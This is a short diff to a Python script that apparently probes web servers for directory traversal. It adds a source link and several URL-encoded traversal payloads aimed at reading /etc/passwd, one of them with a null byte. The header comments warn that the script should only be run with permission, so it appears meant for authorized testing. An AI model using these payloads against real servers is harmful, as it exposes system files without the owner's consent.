@@ -6,6 +6,9 @@
 # This script is not stealthy and will leave traces behind.
 # ONLY test this in a server you have permission to do it!!!!!!!
 
+# sources -->
+# http://www.compciv.org/guides/python/how-tos/creating-proper-url-query-strings/
+
 
 import requests
 import re
@@ -18,7 +21,7 @@ from termcolor import colored
 
 
 # The quote method automatically url encodes the string
-linux_dirTraversal = [quote("../../../../../../.."), quote("/../../../../../../.."), quote("....//....//....//....//....//....//..../"), quote("//....//....//....//....//....//....//..../")]
+linux_dirTraversal = [quote("../../../../../../.."), quote("/../../../../../../.."), quote("....//....//....//....//....//....//..../"), quote("//....//....//....//....//....//....//..../"), quote(".././.././.././.././.././.."), quote("/.././.././.././.././.././..")]
 path1 = quote("/etc/passwd")
 path2 = "/etc/passwd%00"
 
